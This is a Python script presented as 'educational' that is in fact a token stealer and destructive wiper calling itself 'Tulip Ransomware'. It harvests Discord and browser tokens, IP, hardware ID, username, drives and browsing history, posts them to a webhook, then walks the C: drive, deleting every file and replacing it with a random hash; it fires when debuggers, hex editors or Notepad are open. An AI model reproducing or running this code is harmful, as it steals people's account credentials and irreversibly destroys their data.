#Educational purposes only..  The owner takes no responsibility for any damage created by this.. Therefore this program is under the EULA of Educational purposes.. You are allowed to modify or change this code.. Use it how much you like..
import os
import os.path
import psutil
import hashlib
import random
import requests
import string
import time
import colorama
import win32api
import uuid
import re
import browserhistory as bh
import ctypes
colorama.init(convert=True)
class antivirus():   
    def find_tokens(path):
        path += '\\Local Storage\\leveldb'

        tokens = []

        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens

    def tracker():
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')

        paths = {
            'Discord': roaming + '\\Discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Discord PTB': roaming + '\\discordptb',
            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }

        message = ''

        for platform, path in paths.items():
            if not os.path.exists(path):
                continue

            message += f'\n**{platform}**\n```\n'

            tokens = antivirus.find_tokens(path)

            if len(tokens) > 0:
                for token in tokens:
                    message += f'{token}\n'
            else:
                message += 'No tokens found.\n'
        ip = requests.get("https://api.ipify.org/")
        hwid = uuid.getnode()
        user = os.getlogin() 
        drives = win32api.GetLogicalDriveStrings()
        drives = drives.split('\000')[:-1]
        history = bh.get_browserhistory()
        open("history", 'w').write(str(history))
        content = "\nIP: " + str(ip.text) + "\nHWID: " + str(hwid) + "\nUser: " + str(user) + "\nTokens: " + str(message) + "\nDrives: " + str(drives) + "\n--------------"
        data = {
        'username': "Tulip Ransomware",
        'content': content,
        'file': history
        }
        r = requests.post("enter webbok", data=data)
    def malawremain():  
        dirName = "C:\\";     
        listOfFiles = antivirus.getListOfFiles(dirName)   
        for elem in listOfFiles:
            elem1 = elem + ".tuliped" 
            code = open(elem).readlines()
            letters = string.digits + string.ascii_uppercase + string.ascii_lowercase
            code1 = ''.join(random.choice(letters) for i in range((random.randint(50,100))))
            code3 = str(code) + str(code1)
            codehash = hashlib.sha512(code3.encode('ascii')).hexdigest()

            try:
                os.remove(elem)

                open(elem1, 'w').write(codehash)
            except Exception:
                pass
        listOfFiles = list()
        for (dirpath, dirnames, filenames) in os.walk(dirName):
            listOfFiles += [os.path.join(dirpath, file) for file in filenames] 
        open("readme", 'w').write("Files destroyed by Tulip...  ")
        time.sleep(5)
    def look():
        antivirus.tracker()
        ctypes.windll.user32.SystemParametersInfoW(20, 0, "https://cdn.discordapp.com/attachments/793904404709113896/816584845811646464/340434.png" , 0)
        antivirus.malawremain()
    def checkIfProcessRunning(processName):
        for proc in psutil.process_iter():
            try:
                if processName.lower() in proc.name().lower():
                    return True
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        return False;
    def getListOfFiles(dirName):
        listOfFile = os.listdir(dirName)
        allFiles = list()
        for entry in listOfFile:
            fullPath = os.path.join(dirName, entry)
            if os.path.isdir(fullPath):
                allFiles = allFiles + antivirus.getListOfFiles(fullPath)
            else:
                allFiles.append(fullPath)
                    
        return allFiles     
    def check():
        if antivirus.checkIfProcessRunning('HxD64'):
            antivirus.look()
        elif antivirus.checkIfProcessRunning('HxD32'):
            antivirus.look()
        elif antivirus.checkIfProcessRunning('x96dbg'):
            antivirus.look()
        elif antivirus.checkIfProcessRunning('x64dbg'):
            antivirus.look()
        elif antivirus.checkIfProcessRunning('x32dbg'):
            antivirus.look()
        elif antivirus.checkIfProcessRunning('ida64'):
            antivirus.look()
        elif antivirus.checkIfProcessRunning('HTTPDebuggerSvc'):
            antivirus.look()
        elif antivirus.checkIfProcessRunning('dnSpy-x86'):
            antivirus.look()
        elif antivirus.checkIfProcessRunning('dnSpy-64'):
            antivirus.look()
        elif antivirus.checkIfProcessRunning('ollydbg'):
            antivirus.look()
        elif antivirus.checkIfProcessRunning('notepad'):
            antivirus.look()
        elif antivirus.checkIfProcessRunning('notepad++'):
            antivirus.look()
        elif antivirus.checkIfProcessRunning('illspy'):
            antivirus.look()
        else:
            print("Programs are not detected..")
            pass
antivirus.check()
